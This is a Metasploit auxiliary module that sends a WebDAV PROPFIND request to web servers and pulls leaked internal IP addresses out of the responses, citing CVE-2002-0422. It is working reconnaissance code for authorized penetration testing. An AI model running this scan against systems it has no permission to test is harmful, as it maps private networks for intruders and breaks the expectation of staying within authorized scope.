##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanServer
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'HTTP WebDAV Internal IP Scanner',
      'Description' => 'Detect webservers internal IPs though WebDAV',
      'Author'      => ['et'],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2002-0422' ]
        ]
    )

    register_options(
      [
        OptString.new("PATH", [true, "Path to use", '/']),
      ])
  end

  def run_host(target_host)

    begin
      res = send_request_cgi({
        'uri'          => normalize_uri(datastore['PATH']),
        'method'       => 'PROPFIND',
        'data'	=>	'',
        'ctype'   => 'text/xml',
        'version' => '1.0',
        'vhost' => '',
      }, 10)


      if res and res.body
        # short regex
        intipregex = /(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/i

        #print_status("#{res.body}")

        result = res.body.scan(intipregex).uniq


        result.each do |addr|
          print_good("Found internal IP in WebDAV response (#{target_host}) #{addr}")

          report_note(
            :host	=> target_host,
            :proto => 'tcp',
            :sname => (ssl ? 'https' : 'http'),
            :port	=> rport,
            :type	=> 'INTERNAL_IP',
            :data	=> { :ip => addr }
          )
        end
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
